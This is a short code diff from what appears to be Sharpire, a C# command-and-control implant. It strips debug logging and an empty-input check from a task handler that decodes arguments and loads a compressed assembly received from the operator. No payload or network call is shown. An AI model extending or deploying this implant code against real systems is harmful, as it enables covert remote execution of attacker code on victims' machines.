@@ -737,12 +737,6 @@ namespace Sharpire
                 string base64JsonString = parts[1];
                 string jsonString = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64JsonString));
 
-                // Log the raw JSON string for debugging
-                lock (synclock)
-                {
-                    output += $"[DEBUG] Raw JSON String: {jsonString}\n";
-                }
-
                 // Manually parse JSON to extract all values as a generic string array
                 var parametersList = new List<string>();
                 jsonString = jsonString.Trim('{', '}'); // Remove braces if present
@@ -760,17 +754,6 @@ namespace Sharpire
 
                 // Convert list to array and log the parsed values
                 string[] parameters = parametersList.ToArray();
-                lock (synclock)
-                {
-                    output += $"[DEBUG] Parameters Count After Parsing: {parameters.Length}\n";
-                    output += $"[DEBUG] Parameters After Parsing: {string.Join(", ", parameters)}\n";
-                }
-
-                if (parameters.Length == 0)
-                {
-                    output += "[ERROR] No values extracted from JSON input.";
-                    return EncodePacket(packet.type, output, packet.taskId);
-                }
 
                 // Decompress and load the assembly
                 byte[] compressedBytes = Convert.FromBase64String(parts[0]);
